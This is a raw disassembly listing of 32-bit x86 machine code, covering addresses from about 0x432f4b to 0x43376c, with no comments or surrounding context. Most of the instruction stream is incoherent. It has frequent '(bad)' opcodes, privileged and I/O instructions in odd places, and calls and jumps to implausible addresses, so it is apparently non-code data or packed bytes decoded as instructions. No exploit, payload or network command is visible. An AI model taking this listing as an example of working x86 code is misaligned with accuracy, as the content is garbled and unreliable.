  432f4b:	in     al,dx
  432f4c:	jne    0x432f0f
  432f4e:	mov    eax,DWORD PTR [ebp-0x28]
  432f51:	add    DWORD PTR [eax],0xe8058dec
  432f57:	clc    
  432f58:	mov    esi,DWORD PTR [edi-0x8]
  432f5b:	add    dh,dl
  432f5d:	rol    WORD PTR [ebp-0x1],cl
  432f61:	mov    edx,DWORD PTR [eax+0x8]
  432f64:	jne    0x432f26
  432f66:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  432f6d:	inc    ebp
  432f6e:	push   esp
  432f6f:	test   DWORD PTR [ecx+0xf],ecx
  432f72:	sub    edx,esp
  432f74:	add    eax,DWORD PTR [eax]
  432f76:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  432f7c:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  432f83:	mov    eax,DWORD PTR [ecx]
  432f85:	and    BYTE PTR [eax],al
  432f87:	cmp    BYTE PTR [eax],dl
  432f89:	add    BYTE PTR [ebp+0x66],al
  432f8c:	inc    ecx
  432f8e:	push   esp
  432f8f:	(bad)  
  432f90:	jne    0x432f92
  432f92:	push   edx
  432f93:	enterw 0xc1,0x4d
  432f98:	mov    esp,DWORD PTR [esi+0x20]
  432f9b:	add    DWORD PTR [ecx-0x7b],eax
  432f9e:	add    eax,DWORD PTR [ebx]
  432fa0:	str    WORD PTR [eax+0x45]
  432fa4:	lea    ecx,[ebx+0x45890801]
  432faa:	sbb    BYTE PTR [ebx],al
  432fac:	dec    ebp
  432fad:	cmp    al,0xf
  432faf:	inc    ebp
  432fb0:	push   eax
  432fb1:	mov    esi,DWORD PTR [ebx]
  432fb3:	push   eax
  432fb4:	add    eax,eax
  432fb6:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  432fbd:	inc    ebp
  432fbe:	add    BYTE PTR [esi],dh
  432fc0:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  432fc7:	(bad)  
  432fc8:	mov    ebx,eax
  432fca:	loopne 0x433011
  432fcc:	dec    ebp
  432fcd:	mov    ecx,DWORD PTR [edi]
  432fcf:	cld    
  432fd0:	push   eax
  432fd1:	xchg   DWORD PTR [ebx],esi
  432fd3:	add    DWORD PTR [ebx],ebp
  432fd5:	add    BYTE PTR [ebx],ch
  432fd7:	or     BYTE PTR [ecx],bh
  432fd9:	dec    ecx
  432fda:	loopne 0x432fdf
  432fdc:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  432fe2:	push   ebp
  432fe3:	add    DWORD PTR [ebx+0x55100800],eax
  432fe9:	dec    ebp
  432fea:	jmp    0x432f75
  432fec:	mov    esp,DWORD PTR [eax]
  432fee:	sbb    dl,dl
  432ff0:	inc    eax
  432ff1:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  432ff7:	add    BYTE PTR [ebx+0x74528555],cl
  432ffd:	push   ebp
  432ffe:	div    DWORD PTR [ebx]
  433000:	and    eax,DWORD PTR [ebx]
  433002:	add    edx,DWORD PTR [edx-0x30]
  433005:	jno    0x432f92
  433007:	inc    DWORD PTR [eax+eiz*1]
  43300a:	inc    ebp
  43300b:	push   eax
  43300c:	push   eax
  43300d:	mov    esp,DWORD PTR [edi-0x74beff1c]
  433013:	mov    edi,esp
  433015:	push   eax
  433016:	inc    ebp
  433017:	enter  0x458b,0x8
  43301b:	push   ecx
  43301c:	(bad)  
  43301d:	call   0x10d39f5
  433022:	pop    ss
  433023:	push   ebp
  433024:	mov    ecx,DWORD PTR [ebx+0x489408]
  43302a:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  433030:	push   ecx
  433031:	jo     0x43301b
  433033:	inc    DWORD PTR [edi]
  433035:	or     BYTE PTR [eax],al
  433037:	call   0xce3781
  43303c:	fmul   QWORD PTR [ebp+0x55]
  43303f:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  433045:	mov    bh,0x8c
  433047:	adc    al,0x99
  433049:	dec    esp
  43304a:	xor    bl,BYTE PTR [eax]
  43304c:	mov    ecx,DWORD PTR [ebp+0xc]
  43304f:	mov    eax,DWORD PTR [ebp-0x4]
  433052:	mov    esi,DWORD PTR [edi-0x3148f924]
  433058:	push   es
  433059:	retf   
  43305a:	mov    BYTE PTR [ebp-0x30],0x3b
  43305e:	inc    ebp
  43305f:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  433066:	retf   0x83fc
  433069:	into   
  43306a:	dec    ebp
  43306b:	retf   
  43306c:	mov    ecx,DWORD PTR [ebp-0x74]
  43306f:	mov    eax,DWORD PTR [eax]
  433071:	fdiv   QWORD PTR [ebx]
  433073:	mov    bh,0x3
  433075:	push   es
  433076:	mov    esi,ecx
  433078:	sbb    cl,dl
  43307a:	dec    ebp
  43307b:	sar    DWORD PTR [ebx],cl
  43307d:	push   ebp
  43307e:	jne    0x43308f
  433080:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  433086:	lea    ebx,[eax]
  433088:	call   0xf4ccbc4f
  43308d:	sbb    dh,dl
  43308f:	add    edx,ebx
  433091:	push   ebp
  433092:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  433098:	push   ecx
  433099:	mov    DWORD PTR [eax-0x30],edx
  43309c:	test   DWORD PTR [edx],eax
  43309e:	xadd   esp,esi
  4330a1:	pop    es
  4330a2:	add    cl,dl
  4330a4:	mov    eax,ecx
  4330a6:	or     al,0x45
  4330a8:	(bad)  
  4330a9:	push   eax
  4330aa:	add    DWORD PTR [edx+0x0],eax
  4330ad:	add    ecx,DWORD PTR [ecx]
  4330af:	and    dh,cl
  4330b1:	call   0xc73981
  4330b6:	add    DWORD PTR [ebp+0x0],edx
  4330b9:	mov    esp,DWORD PTR [ebp+0x18]
  4330bc:	add    BYTE PTR [eax+0x48],cl
  4330bf:	xor    eax,DWORD PTR [eax]
  4330c1:	add    esp,DWORD PTR [esi+0x3b]
  4330c4:	inc    ebp
  4330c5:	je     0x43304a
  4330c7:	push   ecx
  4330c8:	push   es
  4330c9:	dec    ebp
  4330ca:	mov    DWORD PTR [ebx],eax
  4330cc:	(bad)  
  4330cd:	or     al,0x5e
  4330cf:	inc    eax
  4330d0:	add    BYTE PTR [ebx],al
  4330d2:	data16 and BYTE PTR [ebp+0x50],al
  4330d6:	sub    DWORD PTR [ecx],0xfffffff8
  4330d9:	add    BYTE PTR [ebp-0x75],ah
  4330dc:	add    BYTE PTR [eax],bl
  4330de:	enter  0x894d,0x8b
  4330e2:	int3   
  4330e3:	loopne 0x43311f
  4330e5:	rol    BYTE PTR [eax],0x33
  4330e8:	lea    cx,[ebp+0xa]
  4330ec:	data16 jb 0x433134
  4330ef:	add    BYTE PTR [ebx+0x44890855],cl
  4330f5:	sbb    ah,al
  4330f7:	inc    ebp
  4330f8:	cmp    BYTE PTR [edi],cl
  4330fa:	add    BYTE PTR [edx+0x66],dl
  4330fd:	xor    ecx,DWORD PTR [eax]
  4330ff:	sub    edi,esi
  433101:	mov    eax,DWORD PTR [eax]
  433103:	or     al,0x66
  433105:	ror    edx,cl
  433107:	dec    ebp
  433108:	inc    ebp
  433109:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  43310f:	cld    
  433110:	or     BYTE PTR [edi+0x4501dd],dl
  433116:	ret    0xe8ce
  433119:	retf   
  43311a:	(bad)  
  43311b:	dec    ebp
  43311c:	mov    al,0x8b
  43311e:	in     al,dx
  43311f:	and    BYTE PTR [ebx],bh
  433121:	or     al,BYTE PTR [ebp+0x27]
  433124:	in     al,dx
  433125:	xchg   eax,ebp
  433127:	add    edi,eax
  433129:	add    BYTE PTR [eax+0x3f52ed55],bh
  43312f:	push   ebp
  433130:	inc    ebp
  433131:	xor    ebx,edx
  433133:	add    ebp,eax
  433135:	push   edx
  433136:	push   bp
  433138:	inc    ebp
  433139:	(bad)  
  43313a:	jmp    0xc342f793
  43313f:	sbb    al,0x33
  433141:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  433148:	add    BYTE PTR [ebp+0x44],0x8b
  43314c:	jmp    0xf98b:0x100041c8
  433153:	xor    esi,DWORD PTR [edx+0x3]
  433156:	mov    ecx,DWORD PTR [edi]
  433158:	fmul   DWORD PTR [edx]
  43315a:	add    BYTE PTR [eax],al
  43315c:	lea    eax,[ebx-0x4700273c]
  433162:	add    al,0x4f
  433164:	pop    DWORD PTR [eax]
  433166:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  43316c:	push   edx
  43316d:	inc    WORD PTR [ebp+0x8]
  433171:	mov    eax,0x514f4d
  433176:	(bad)
  43317a:	add    al,al
  43317c:	xor    DWORD PTR [ebx-0x74baf730],eax
  433182:	test   DWORD PTR [esi+0x74],esp
  433185:	inc    ebp
  433186:	mov    DWORD PTR [eax+0xa4f08],edi
  43318c:	add    BYTE PTR [ecx-0x76c435bb],cl
  433192:	or     dh,cl
  433194:	or     eax,0x8b8d5045
  433199:	inc    ebp
  43319a:	mov    WORD PTR [ecx+0x3b8a00],?
  4331a0:	jne    0x4331d5
  4331a2:	mov    edi,DWORD PTR [edx+0x8f3a18]
  4331a8:	add    DWORD PTR [ebx],eax
  4331aa:	add    bh,bh
  4331ac:	adc    DWORD PTR [eax],ecx
  4331ae:	adc    DWORD PTR [ebp+0x55],edi
  4331b1:	push   es
  4331b2:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  4331b8:	mov    ebp,DWORD PTR [eax+ebp*1+0x50c411da]
  4331bf:	inc    ebp
  4331c0:	mov    esp,edi
  4331c2:	or     al,0xda
  4331c4:	push   eax
  4331c5:	(bad)  
  4331c6:	jne    0x43317c
  4331c8:	call   0x3b2ab7
  4331cd:	inc    ebp
  4331ce:	rol    ah,0x84
  4331d1:	call   0xbc43f8d6
  4331d6:	jne    0x4331b2
  4331d8:	mov    ebx,ebx
  4331da:	inc    edi
  4331dc:	and    al,al
  4331de:	fs jmp 0x7ec877e3
  4331e4:	bswap  ecx
  4331e6:	scas   al,BYTE PTR es:[edi]
  4331e7:	inc    esp
  4331e8:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  4331ef:	or     BYTE PTR [ebx-0x97717c6],0x83
  4331f6:	call   DWORD PTR [edi]
  4331f8:	shr    ah,0x84
  4331fb:	xchg   DWORD PTR [eax],eax
  4331fd:	add    DWORD PTR [eax],eax
  4331ff:	add    bh,bh
  433201:	dec    ebp
  433202:	and    BYTE PTR [ecx-0x38],dl
  433205:	push   eax
  433206:	dec    DWORD PTR [ebx+0xfd885]
  43320c:	mov    BYTE PTR [ebp+0x508bac00],cl
  433212:	mov    WORD PTR [ecx+0x0],ss
  433215:	lea    ecx,[ebx+0x108b20d8]
  43321b:	mov    WORD PTR [edx],ds
  43321d:	add    BYTE PTR [edi+0xff01ff],al
  433223:	mov    ecx,DWORD PTR [ebp-0x28]
  433226:	push   ecx
  433227:	shl    BYTE PTR [ebp+0x3a],0x8b
  43322b:	inc    ebp
  43322c:	in     al,0xeb
  43322e:	jno    0x4331bb
  433230:	push   edx
  433231:	mov    DWORD PTR [eax-0x28],edx
  433234:	mov    eax,DWORD PTR [ebp+0x20]
  433237:	je     0x4331c0
  433239:	mov    eax,DWORD PTR [ecx]
  43323b:	sbb    BYTE PTR [eax],al
  43323d:	pop    DWORD PTR [eax]
  43323f:	add    esi,eax
  433241:	add    bl,al
  433243:	adc    DWORD PTR [edi],esi
  433245:	jmp    0x8bce8297
  43324a:	sub    BYTE PTR [ebp+eax*2-0x63c4ca00],cl
  433251:	jne    0x4331de
  433253:	mov    ecx,DWORD PTR [eax]
  433255:	in     al,0x75
  433257:	pop    DWORD PTR [ecx+0x5101]
  43325d:	push   edx
  43325e:	inc    DWORD PTR [ebx]
  433260:	adc    BYTE PTR [ecx+0x45721cc6],cl
  433266:	add    BYTE PTR [edi+0x9],dl
  433269:	call   DWORD PTR [esi]
  43326b:	and    dl,al
  43326d:	and    bh,bh
  43326f:	inc    edi
  433271:	test   eax,edx
  433273:	sldt   ebx
  433276:	cmp    DWORD PTR [eax],eax
  433278:	pushf  
  433279:	(bad)  
  43327a:	jmp    0x433288
  43327c:	mov    eax,edi
  43327e:	or     al,0x75
  433280:	inc    eax
  433281:	call   0x432989
  433286:	mov    eax,eax
  433288:	loopne 0x43320e
  43328a:	inc    ebp
  43328b:	add    BYTE PTR [ebx+0x1451c00],cl
  433291:	mov    eax,DWORD PTR [ebp+0x20]
  433294:	add    edi,ecx
  433296:	add    BYTE PTR [eax],ch
  433298:	cmp    edi,0x18
  43329b:	test   DWORD PTR [ebp+0xf],esi
  43329e:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  4332a5:	jne    0x4332a9
  4332a7:	call   0xffa22d6c
  4332ac:	leave  
  4332ad:	rcr    BYTE PTR [esp+eax*4],0x55
  4332b1:	add    ah,ch
  4332b3:	add    BYTE PTR [edi-0x48fef979],dh
  4332b9:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  4332c0:	inc    esp
  4332c1:	mov    ebx,DWORD PTR [eax]
  4332c3:	fcom   st(2)
  4332c5:	add    BYTE PTR [edi],bl
  4332c7:	lea    ecx,[eax-0x18]
  4332ca:	(bad)  
  4332cb:	push   DWORD PTR [ecx]
  4332cd:	call   0xffb5802f
  4332d2:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  4332d6:	fstp   DWORD PTR [esi+ebx*8]
  4332d9:	push   ebp
  4332da:	pop    ebp
  4332db:	mov    esi,DWORD PTR [edx-0x38]
  4332de:	add    DWORD PTR [eax],0x28
  4332e1:	mov    edi,DWORD PTR [ebx]
  4332e3:	xor    esi,DWORD PTR [edx+0x3]
  4332e6:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  4332ea:	pop    ebp
  4332eb:	or     al,0x4
  4332ed:	inc    ecx
  4332ee:	push   ebp
  4332ef:	(bad)  
  4332f0:	in     al,dx
  4332f1:	or     ah,ch
  4332f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4332f4:	xbegin 0xffc8a8ea
  4332fa:	clc    
  4332fb:	adc    al,0x45
  4332fd:	idiv   BYTE PTR [ecx]
  4332ff:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  433306:	test   DWORD PTR [ecx+0x665b00f8],ebx
  43330c:	add    BYTE PTR [ecx+0x66],dh
  43330f:	add    eax,DWORD PTR [ebp+0x52]
  433312:	adc    eax,0x20
  433315:	xchg   DWORD PTR [ecx+0x4400fc01],ecx
  43331b:	test   DWORD PTR [eax],eax
  43331d:	clc    
  43331e:	data16 or al,BYTE PTR [ebp+0x45]
  433322:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  433329:	rol    BYTE PTR [ebp+0x45],1
  43332c:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  433332:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  433338:	push   ebx
  433339:	add    BYTE PTR [ecx+0x0],dl
  43333c:	push   ecx
  43333d:	jge    0x433372
  43333f:	add    BYTE PTR [esi+0x4],dl
  433342:	jne    0x4333a9
  433344:	mov    edx,0x457200
  433349:	jmp    0x43330d
  43334b:	xor    edi,DWORD PTR [ebx]
  43334d:	pop    edi
  43334e:	cvtdq2ps xmm7,xmm0
  433351:	ret    0x0
  433354:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  43335a:	xor    ecx,DWORD PTR [edi]
  43335c:	add    eax,DWORD PTR [ecx+0x3b]
  43335f:	push   ebx
  433360:	rdpmc  
  433362:	out    0x8d,al
  433364:	add    BYTE PTR [eax],cl
  433366:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  43336c:	ret    0x450c
  43336f:	sbb    al,0x8b
  433371:	cmp    eax,esi
  433373:	or     cl,al
  433375:	or     al,0xc2
  433377:	pop    eax
  433378:	inc    ebp
  433379:	add    ecx,DWORD PTR [edi]
  43337b:	add    esi,DWORD PTR [ebp+0x39]
  43337e:	invd   
  433380:	jge    0x43338c
  433382:	mov    eax,0x478ac0
  433387:	cli    
  433388:	xor    esp,ecx
  43338a:	mov    ebx,0x5b8ac0
  43338f:	ret    0x33
  433392:	mov    eax,0x833a8b
  433397:	sub    BYTE PTR [ebx],al
  433399:	inc    ebp
  43339a:	data16 ss clc 
  43339d:	pushf  
  43339e:	inc    bh
  4333a0:	mov    esp,esp
  4333a2:	hlt    
  4333a3:	test   DWORD PTR [ebp-0x8],esi
  4333a6:	mov    eax,DWORD PTR [ebp-0x14]
  4333a9:	cmp    BYTE PTR [ebx-0x76478864],cl
  4333af:	dec    edi
  4333b0:	or     BYTE PTR [eax],al
  4333b2:	jne    0x43333d
  4333b4:	mov    esi,esp
  4333b6:	call   0x77a9bf7b
  4333bb:	inc    ebp
  4333bc:	mov    DWORD PTR [eax+0x994f0c],edi
  4333c2:	add    BYTE PTR [ecx-0x3ffe0717],cl
  4333c8:	add    BYTE PTR [esi+0x7d],ah
  4333cb:	inc    ebp
  4333cc:	mov    bx,WORD PTR [ebp+0x8]
  4333d0:	add    DWORD PTR [ebp+0x51],0x30c008b
  4333d7:	inc    ebp
  4333d8:	mov    bx,di
  4333db:	lock test BYTE PTR [ecx+0x7000801],bh
  4333e2:	jge    0x4333a5
  4333e4:	mov    ecx,DWORD PTR [ebx-0x660613f0]
  4333ea:	cli    
  4333eb:	xor    bl,bh
  4333ed:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  4333f3:	test   BYTE PTR [eax],cl
  4333f5:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  4333fc:	cmp    ebp,eax
  4333fe:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  433405:	test   BYTE PTR [ebp+0x1],bh
  433408:	mov    ebx,0x458a00
  43340d:	xor    esi,DWORD PTR [ebx]
  43340f:	add    esp,DWORD PTR [esi-0x77]
  433412:	pop    ebp
  433413:	loopne 0x43347b
  433415:	inc    ebp
  433416:	clc    
  433417:	xor    edi,DWORD PTR [ebx]
  433419:	add    esi,DWORD PTR [edx-0x77]
  43341c:	data16 fdivr QWORD PTR [ebp-0x49]
  433420:	mov    ebx,0xb78afc
  433425:	hlt    
  433426:	xor    edi,DWORD PTR [eax]
  433428:	data16 add BYTE PTR [ebp+0x66],bl
  43342c:	data16 lock clc 
  43342f:	cmp    BYTE PTR [ebx],bh
  433431:	add    BYTE PTR [edi+0x66],dh
  433434:	psubq  mm7,QWORD PTR [ebp-0x2]
  433438:	ltr    WORD PTR [ebp+0x66]
  43343c:	add    esi,eax
  43343e:	add    di,WORD PTR [ebp+0x2b]
  433442:	data16 data16 jge 0x4334c3
  433446:	mov    ebx,0xe08a8b
  43344b:	jge    0x433480
  43344d:	data16 data16 xor al,0x5d
  433451:	data16 data16 jne 0x43344d
  433455:	mov    edi,DWORD PTR [ebx]
  433457:	fdiv   QWORD PTR [edx+0x7d]
  43345a:	data16 data16 jge 0x433492
  43345e:	mov    ebx,0x758a66
  433463:	mov    esi,0x667233
  433468:	pop    ebp
  433469:	or     BYTE PTR [esi+0x0],ah
  43346c:	clc    
  43346d:	mov    edi,DWORD PTR [ebx]
  43346f:	lock ja 0x4333fd
  433472:	(bad)  
  433474:	jge    0x43346d
  433476:	invd   
  433478:	pop    ebp
  433479:	add    BYTE PTR [ebx],al
  43347b:	(bad)  
  43347c:	cmp    di,WORD PTR [ebp+0xf]
  433480:	data16 sbb bh,BYTE PTR [ebp+0x0]
  433484:	mov    bx,WORD PTR [ebp-0x10]
  433488:	pop    bp
  43348a:	fbstp  TBYTE PTR [ebx]
  43348c:	test   DWORD PTR [ebx],eax
  43348e:	add    BYTE PTR [ebx],bh
  433490:	add    BYTE PTR [esi+0x7d],ah
  433493:	jge    0x433420
  433495:	data16 in al,dx
  433497:	pop    ebp
  433498:	stc    
  433499:	bsf    ecx,DWORD PTR [ebp+0x66320099]
  4334a0:	mov    edi,ebx
  4334a2:	in     al,dx
  4334a3:	test   BYTE PTR [ebp+0x0],bh
  4334a6:	mov    eax,DWORD PTR [eax]
  4334a8:	call   0xbd402e38
  4334ad:	cmp    BYTE PTR [ecx-0x7699ce00],bl
  4334b3:	sti    
  4334b4:	call   0x8b4bb244
  4334b9:	add    ebp,esp
  4334bb:	mov    bx,di
  4334be:	jnp    0x4334e6
  4334c0:	mov    DWORD PTR [ebx+0x387df808],ecx
  4334c6:	mov    eax,DWORD PTR [eax]
  4334c8:	call   0x7c3ec033
  4334cd:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  4334d3:	data16 data16 fistp WORD PTR [ebp+0xe]
  4334d8:	xor    DWORD PTR [edi-0x48fff7af],0xfb66f403
  4334e2:	fisttp WORD PTR [ecx-0x7401f77b]
  4334e8:	(bad)  
  4334e9:	cld    
  4334ea:	jne    0x433524
  4334ec:	xor    eax,DWORD PTR [eax]
  4334ee:	mov    esp,DWORD PTR [esi-0x10]
  4334f1:	sti    
  4334f2:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  4334f9:	data16 adc bl,bh
  4334fc:	push   ebp
  4334fd:	xor    ecx,DWORD PTR es:[ebx+0x38e4f88b]
  433504:	mov    WORD PTR [eax],es
  433506:	cdq    
  433507:	data16 xor bh,bl
  43350a:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  433510:	mov    esp,DWORD PTR [esi-0x14]
  433513:	fisttp WORD PTR [ebx-0x3748a9f2]
  433519:	or     al,0x2b
  43351b:	mov    bh,0xba
  43351d:	hlt    
  43351e:	mov    bh,bl
  433520:	add    BYTE PTR [ecx-0x7446f3cd],cl
  433526:	dec    edi
  433527:	or     al,0x0
  433529:	mov    edi,DWORD PTR [ebx]
  43352b:	or     BYTE PTR [ebp+0x3b],dh
  43352e:	mov    ecx,DWORD PTR [edi]
  433530:	fdivr  QWORD PTR [ebx-0x7499ff83]
  433536:	xor    al,0xd8
  433538:	pop    bp
  43353a:	lock xor esi,DWORD PTR [ebx]
  43353d:	lea    esp,[esi+0x1f]
  433540:	icebp  
  433541:	jb     0x433547
  433543:	add    al,al
  433545:	jge    0x433553
  433547:	mov    eax,eax
  433549:	fsubr  st,st(3)
  43354b:	pop    ebp
  43354c:	mov    esi,DWORD PTR [ebx]
  43354e:	in     al,0x8d
  433550:	rcr    DWORD PTR [edi],0xc2
  433553:	jb     0x4335b3
  433555:	add    cl,cl
  433557:	jge    0x433565
  433559:	mov    edx,DWORD PTR [ebp-0x20]
  43355c:	in     al,dx
  43355d:	pop    ebp
  43355e:	data16 data16 or BYTE PTR [esi+edi*4],bh
  433563:	data16 cmp bh,BYTE PTR [ebp+0x0]
  433567:	mov    ebp,DWORD PTR [ebx]
  433569:	fdivr  QWORD PTR [esi+0x668a5d]
  43356f:	cmp    al,0x33
  433571:	mov    si,0x4f7d
  433575:	mov    eax,DWORD PTR [eax]
  433577:	lock inc ebp
  433579:	mov    esi,DWORD PTR [edi]
  43357b:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  433582:	clc    
  433583:	(bad)  
  433584:	cmp    edi,DWORD PTR [ebx]
  433586:	je     0x433597
  433588:	push   ebx
  433589:	loopne 0x43359a
  43358b:	dec    ecx
  43358d:	mov    esp,DWORD PTR [edi-0x1c]
  433590:	int    0xf1
  433592:	mov    esi,0x703084d
  433597:	pcmpgtd mm6,mm1
  43359a:	add    BYTE PTR [ebp+0x66],dh
  43359d:	jmp    0x43356a
  43359f:	mov    eax,DWORD PTR [ebx]
  4335a1:	lock push ebp
  4335a3:	ror    DWORD PTR [ebp-0x2972feb3],1
  4335a9:	or     bh,dl
  4335ab:	jb     0x4335ab
  4335ad:	add    BYTE PTR [ebx-0x1a7487b3],cl
  4335b3:	loopne 0x4335b5
  4335b5:	jne    0x4335b5
  4335b7:	data16 add BYTE PTR [esi+eiz*2],dh
  4335bb:	mov    ecx,ebx
  4335bd:	data16 cmp cl,dh
  4335c0:	add    BYTE PTR [eax],bh
  4335c2:	data16 add bl,cl
  4335c5:	data16 cmp dh,dl
  4335c8:	add    BYTE PTR [edx],bh
  4335ca:	data16 add bl,cl
  4335cd:	enterw 0x4df1,0x19
  4335d2:	pop    edi
  4335d3:	jne    0x433556
  4335d5:	mov    esi,DWORD PTR [edi]
  4335d7:	call   0x77b7c178
  4335dc:	xor    ebp,DWORD PTR [ebx]
  4335de:	lea    esp,[esi+0x48]
  4335e1:	repnz in eax,0x3b
  4335e4:	add    BYTE PTR [ebp-0x37],dh
  4335e7:	xor    edx,DWORD PTR [ebp-0x15]
  4335ea:	in     al,dx
  4335eb:	xor    edx,DWORD PTR [esi+0x40]
  4335ee:	mov    DWORD PTR [edi],0x338545fc
  4335f4:	clc    
  4335f5:	add    esi,DWORD PTR [esi]
  4335f7:	pop    edi
  4335f8:	pushf  
  4335f9:	pop    ebx
  4335fa:	call   0xff4435c1
  4335ff:	mov    edi,eax
  433601:	push   ecx
  433602:	pop    es
  433603:	mov    edi,DWORD PTR [edx]
  433605:	push   esi
  433606:	inc    esp
  433607:	(bad)  
  433608:	jle    0x43360a
  43360a:	popa   
  43360b:	data16 (bad) 
  43360d:	into   
  43360e:	addr16 cmp ch,cl
  433611:	add    BYTE PTR [ecx+0x7ce0866],bh
  433617:	cmp    ah,BYTE PTR [esi+0x0]
  43361a:	add    bh,al
  43361c:	(bad)  
  43361d:	cld    
  43361e:	add    BYTE PTR [ebp+0x36c3f866],al
  433624:	cmp    BYTE PTR [eax+eax*1-0x3c31999a],bl
  43362b:	pop    ebp
  43362c:	or     BYTE PTR [edi+0x0],dl
  43362f:	mov    bh,0x66
  433631:	mov    edi,0xff038dc3
  433636:	jne    0x433689
  433638:	lea    edx,[ecx+0x1]
  43363b:	mov    ebx,0xd64ff1
  433640:	sar    DWORD PTR [ebx],1
  433642:	test   BYTE PTR [ebp+0x32],dh
  433645:	mov    DWORD PTR [esp+edi*8-0x76],esp
  433649:	push   edi
  43364a:	xor    BYTE PTR [ebx],0x3a
  43364d:	mov    esi,ebx
  43364f:	xor    eax,DWORD PTR [eax-0x3c73819a]
  433655:	xor    al,BYTE PTR [ebp+0x64]
  433658:	pop    ebx
  433659:	mov    ebx,0x9c3a37
  43365e:	je     0x43368b
  433660:	xor    edi,DWORD PTR [ebx+0x668a33]
  433666:	mov    WORD PTR [ebx],?
  433668:	xor    bh,BYTE PTR [ebx+0x8b4f64]
  43366e:	pop    edi
  43366f:	cmp    ecx,ecx
  433671:	jne    0x4336c8
  433673:	mov    ebp,esp
  433675:	cld    
  433676:	push   esi
  433677:	pop    ebx
  433678:	inc    ebp
  433679:	stc    
  43367a:	aaa    
  43367b:	test   DWORD PTR [eax+edi*8-0x317af642],ebx
  433682:	clc    
  433683:	test   dl,dl
  433685:	xor    al,0xff
  433687:	fs pop si
  43368a:	or     bl,al
  43368c:	dec    BYTE PTR [ebx+0x57665100]
  433692:	retf   0x3845
  433695:	aaa    
  433696:	add    BYTE PTR [esi+eiz*2+0x3a85cabe],bl
  43369d:	clc    
  43369e:	add    BYTE PTR [ebx+0x66],bl
  4336a1:	dec    edx
  4336a3:	mov    edx,DWORD PTR [edi-0x76]
  4336a6:	push   edi
  4336a7:	add    al,0xb7
  4336a9:	xor    al,0xba
  4336ab:	cmp    al,0x8d
  4336ad:	je     0x4336ae
  4336af:	mov    edx,DWORD PTR [ecx-0x46]
  4336b2:	push   ecx
  4336b3:	lea    edi,[ebx+0x514fff]
  4336b9:	push   ecx
  4336ba:	cmp    edx,DWORD PTR [ebx+0x75]
  4336bd:	mov    ecx,DWORD PTR [ecx+0x723afcbb]
  4336c3:	add    BYTE PTR [ebx],dh
  4336c5:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  4336cb:	add    BYTE PTR [ebx+esi*1+0x4f64bb32],cl
  4336d2:	mov    ebx,0x3b3a00
  4336d7:	jne    0x433704
  4336d9:	mov    DWORD PTR [ebx+0x728afc],edi
  4336df:	xor    esi,DWORD PTR [ebx]
  4336e1:	mov    edi,DWORD PTR [ebx+0x8d4f33]
  4336e7:	push   edi
  4336e8:	cmp    esp,ebp
  4336ea:	jne    0x4336ec
  4336ec:	sbb    DWORD PTR [eax],0x8085c3fc
  4336f2:	clc    
  4336f3:	inc    esp
  4336f4:	pop    ebx
  4336f5:	sti    
  4336f6:	add    eax,0xeb8bc075
  4336fb:	cld    
  4336fc:	xor    edi,DWORD PTR ds:0xf8c3855e
  433702:	mov    ecx,DWORD PTR [ecx+edx*2]
  433705:	rol    DWORD PTR [ebp-0x37],0xf
  433709:	mov    DWORD PTR [eax],ecx
  43370b:	inc    edi
  43370c:	(bad)  
  43370d:	in     eax,0x2
  43370f:	add    bh,bh
  433711:	(bad)  
  433712:	mov    esi,0xc38a5e
  433717:	mov    esi,DWORD PTR [ebx]
  433719:	push   ecx
  43371a:	mov    edi,0xfc4fc7
  43371f:	test   DWORD PTR [ebp-0x8],edx
  433722:	data16 ss (bad) 
  433725:	pushf  
  433726:	sub    ebp,eax
  433728:	inc    ebp
  433729:	(bad)  
  43372a:	sub    edi,edi
  43372c:	mov    DWORD PTR [ebx+0x3a03ba08],ecx
  433732:	inc    ebp
  433733:	add    BYTE PTR [esi+0x2b],ah
  433736:	or     bh,BYTE PTR [edx+0xf8ac2]
  43373c:	cmp    al,0x33
  43373e:	mov    edi,DWORD PTR [edx+0x24f81]
  433744:	(bad)  
  433745:	cmp    esi,DWORD PTR [ebx]
  433747:	je     0x433701
  433749:	push   ebx
  43374a:	dec    edi
  43374b:	str    ecx
  43374e:	cmp    esp,DWORD PTR [edi+0x75]
  433751:	int    0x33
  433753:	mov    edi,0x789085f
  433758:	mov    ecx,DWORD PTR [eax]
  43375a:	cld    
  43375b:	add    cl,cl
  43375d:	data16 add al,0xcb
  433760:	push   ebp
  433761:	add    ebp,esp
  433763:	jne    0x433751
  433765:	(bad)  
  433766:	mov    DWORD PTR [ecx],0xd685f7ec
  43376c:	clc    
